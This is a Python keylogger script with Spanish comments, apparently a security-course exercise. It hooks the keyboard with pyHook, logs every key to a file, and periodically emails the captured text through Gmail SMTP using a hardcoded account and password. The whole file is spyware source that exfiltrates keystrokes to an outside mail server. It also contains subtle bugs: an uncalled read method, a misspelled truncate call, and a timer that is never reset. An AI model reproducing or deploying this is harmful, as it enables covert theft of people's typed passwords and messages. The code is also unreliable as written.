import pyHook, pythoncom, sys, logging, time, datetime


carpeta_destino = 'C:\\Users\\bonil\\OneDrive\\Desktop\\ciberseguridad\\py\\KeyLogger\\KeyLogger.txt'
segundos_espera = 7
timeout = time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True 
    else: 
        return False
    
def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read
        data= data.replace('Space', '')
        data = data.replace('\n', '')
        data = 'Mensaje capturado a las : '+ fecha +'\n' + data
        print(data)
        crearEmail('pruebaKeyLogger@gmail.com', 'prueba123', 'pruebaKeyLogger@gmail.com', 'Nueva Captura:' +fecha, data)
        f.seek(0)
        f.truncale()
        

def crearEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser = user
    mailPass = passw

    From = user
    To = [recep]  # Convertir a lista para que funcione con .join()

    Subject = subj
    Txt = body

    email = """\
From: %s
To: %s
Subject: %s

%s
""" % (From, ", ".join(To), Subject, Txt)  # Unir destinatarios con comas

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()

        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)

        server.close()
        print('Correo enviado con éxito!!')

    except Exception as e:  # Capturar excepciones específicas
        print(f'Correo fallido: {e}')  # Imprimir mensaje de error



def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)  # Sintaxis corregida
    logging.log(10, event.Key) # Capitalización corregida
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True: # Sintaxis corregida
    if TimeOut():
        EnviarEmail()
    pythoncom.PumpWaitingMessages() # Indentación corregida